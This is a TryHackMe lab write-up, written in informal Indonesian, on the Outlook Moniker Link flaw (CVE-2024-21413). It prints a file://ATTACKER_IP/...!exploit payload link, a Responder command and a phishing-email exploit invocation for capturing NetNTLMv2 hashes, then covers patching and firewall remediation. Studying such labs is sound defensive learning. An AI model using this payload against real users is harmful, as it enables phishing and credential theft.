# Moniker Link (CVE-2024-21413)

---

*   **Room Link:** [Moniker Link](https://tryhackme.com/r/room/monikerlink)
*   **Category:** Exploitation Basics
*   **Difficulty:** Medium

---

## Introduction

Room ini ngebahas kerentanan kritis di Microsoft Outlook yang dikenal sebagai **Moniker Link** (CVE-2024-21413).

**Poin Utama:**
*   **CVE-2024-21413:** Ditemuin sama Check Point Research (Haifei Li), dipublikasiin Februari 2024.
*   **Impact:**
    *   **Bypass Protected View:** Outlook biasanya ngeblok link berbahaya atau bukanya di mode aman (Protected View Area), tapi celah ini nge-bypass fitur itu.
    *   **Credential Leakage:** Penyerang bisa nyuri kredensial NTLM user (NetNTLMv2 hash).
    *   **RCE (Remote Code Execution):** Potensi eksekusi kode jarak jauh.
*   **Severity:** CVSS 9.8 (Critical).

---

## Moniker Link (CVE-2024-21413)

Task ini ngejelasin cara kerja vulnerability Moniker Link.

**1. Konsep Moniker Link**
Outlook pake "Moniker Link" buat proses protokol tertentu. Biasanya, protokol `http://` atau `https://` bakal buka browser. Tapi, protokol kayak `file://` nyoba ngakses resource lokal atau network share (SMB).

**2. Mekanisme Serangan**
*   **Normal:** Kalau kita kirim link `file://ATTACKER_IP/share`, Outlook bakal curiga dan nampilin warning security.
*   **Bypass:** Dengan nambahin tanda seru (`!`) dan karakter random di belakang ekstensi file, kita bisa nipu Outlook.
    *   *Payload:* `file://ATTACKER_IP/test!exploit`
    *   Outlook gagal validasi link ini sebagai berbahaya dan nyoba ngaksesnya *tanpa* warning dan *tanpa* Protected View.

**3. Dampak (Credential Theft)**
Waktu Outlook nyoba ngakses path SMB (`\\ATTACKER_IP\test`), Windows secara otomatis bakal nyoba lakuin autentikasi (Single Sign-On).
*   Akibatnya: Windows ngirim **NetNTLMv2 Hash** user ke mesin penyerang.
*   Penyerang bisa nangkep hash ini pake tool kayak **Responder**.

**4. Versi Terdampak**
*   Microsoft Office LTSC 2021
*   Office 2019
*   Office 2016
*   Office 365 (Enterprise)
*   (Udah dipatch per Patch Tuesday Februari 2024)

---

## Exploitation

Task ini mempraktekin serangan buat nyuri NTLM Hash user.

**1. Skenario**
Kita berperan sebagai penyerang yang ngirim email phishing berisi link berbahaya ke korban (Outlook user). Tujuannya buat nangkep hash password mereka.

**2. Persiapan (Attacker Machine)**
*   **Responder:** Tool buat falsuin service SMB/LLMNR dan nangkep hash autentikasi.
    *   Command: `sudo responder -I tun0`
    *   (Pastiin pake interface VPN `tun0` atau `eth0` sesuai koneksi TryHackMe).

**3. Ngirim Payload**
Kita pake script Python (biasanya disediain di mesin attacker, misal `exploit.py` atau `poc.py`) buat ngirim email SMTP.

*   **Payload Moniker Link:**
    ```html
    <a href="file://ATTACKER_IP/imnotreal!exploit">Click me</a>
    ```
    *Note: Bagian `!exploit` itu kunci bypass-nya.*

*   **Jalanin Exploit:**
    ```bash
    python3 exploit.py --target [EMAIL_KORBAN] --host [SMTP_SERVER] --attacker [ATTACKER_IP]
    ```

**4. Hasil (Capture Hash)**
1.  Korban buka email dan klik link (walaupun linknya aneh, Outlook ketipu buat nyoba koneksi SMB).
2.  Di terminal **Responder**, bakal muncul **NetNTLMv2 Hash** milik korban.
    ```
    [SMB] NTLMv2-SSP Hash     : Admin::M57...
    ```
3.  Copy hash itu buat di-crack nanti.

---

## Remediation

Gimana cara nyegah serangan ini?

**1. Patching (Paling Utama)**
Microsoft udah rilis patch buat CVE-2024-21413 di **Februari 2024**.
*   Segera update Microsoft Office / Outlook ke versi terbaru.
*   Cek update lewat Windows Update atau Microsoft Update Catalog.

**2. Konfigurasi Firewall**
Blok trafik SMB (port 445) keluar (outbound) dari jaringan user ke internet. Ini bakal nyegah Windows ngirim hash NTLM ke server penyerang di luar jaringan.

**3. User Awareness**
*   Jangan asal klik link dari email gak dikenal.
*   Perhatiin link yang mencurigakan (walaupun fitur *hover* di Outlook mungkin gak selalu nampilin bentuk asli Moniker Link yang udah dimodifikasi).

---

## Conclusion

Vulnerability Moniker Link (CVE-2024-21413) ngajarin kita bahwa:
1.  Fitur keamanan kayak "Protected View" bisa di-bypass pake manipulasi protokol link (`file://` + `!`).
2.  Dampaknya kritis banget (CVSS 9.8) karena bisa nyuri kredensial user tanpa interaksi yang rumit (cuma klik link).
3.  Selalu update software (Patch Tuesday) itu pertahanan terbaik.

**Room Completed!** ðŸŽ‰
